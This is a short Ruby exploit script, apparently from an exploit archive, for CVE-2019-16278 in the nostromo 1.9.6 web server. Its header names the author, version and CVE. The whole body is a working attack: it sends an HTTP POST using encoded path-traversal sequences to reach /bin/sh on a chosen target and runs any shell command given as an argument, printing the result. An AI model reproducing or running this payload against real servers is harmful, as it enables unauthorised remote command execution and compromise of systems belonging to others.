#!/bin/ruby

=begin
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278
=end

require "socket"

HOST = "X.X.X.X" # edit your target ip address here
PORT = 80        # edit your target port number here

def exploit(cmd)
    payload = "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n#{cmd} 2>&1"
    socket = TCPSocket.new(HOST, PORT)
    socket.write(payload)
    puts socket.read
    socket.close
end

if ARGV.empty?
  print "USAGE: #{__FILE__} <<bash command>>"
  exit
else
  cmd = ARGV[0]
  exploit(cmd)
end
